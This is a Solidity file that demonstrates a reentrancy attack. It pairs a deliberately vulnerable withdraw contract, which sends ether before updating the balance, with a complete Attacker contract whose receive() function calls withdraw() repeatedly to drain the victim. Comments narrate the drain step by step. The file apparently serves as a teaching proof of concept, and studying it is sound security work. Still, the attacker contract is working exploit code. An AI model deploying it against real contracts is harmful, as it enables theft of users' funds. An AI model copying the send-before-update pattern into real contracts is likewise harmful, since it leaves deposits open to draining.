// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract VulnerableWithdraw {
    mapping(address => uint) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint amount = balances[msg.sender];

        // ❌ Sending ether before updating state
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Transfer failed");

        // ❌ Balance update after
        balances[msg.sender] = 0;
    }
}
// .000000012322222211 ETH



interface IVictim {
    function withdraw() external;
    function deposit() external payable;
}

contract Attacker {
    IVictim public target;

    constructor(address _target) {
        target = IVictim(_target);
    }

    // Receive ETH and attack again!
    receive() external payable {
        if (address(target).balance > 1 ether) {
            target.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        target.deposit{value: 1 ether}();
        target.withdraw();
    
    }
}

// Victim deposits:

// Let’s say you (honest user) deposited 12 ETH to the victim contract.

// Attacker deposits:

// Attacker calls attack() and sends 1 ETH to target.deposit().

// Now attacker calls target.withdraw():

// This triggers the withdraw() function in the victim contract.

// Attacker's balance is 1 ETH.

// Victim contract calls msg.sender.call{value: 1} — so sends 1 ETH to the attacker.

// Now receive() in attacker contract triggers:

// Since victim still has > 1 ETH, attacker calls withdraw() AGAIN.

// The Victim's balance for attacker is still 1 ETH because it hasn't been updated yet.

// So again 1 ETH is transferred. Now attacker has received 2 ETH.

// This repeats (maybe 3–5 times) until:

// Victim's ETH is drained.

// Or gas runs out.

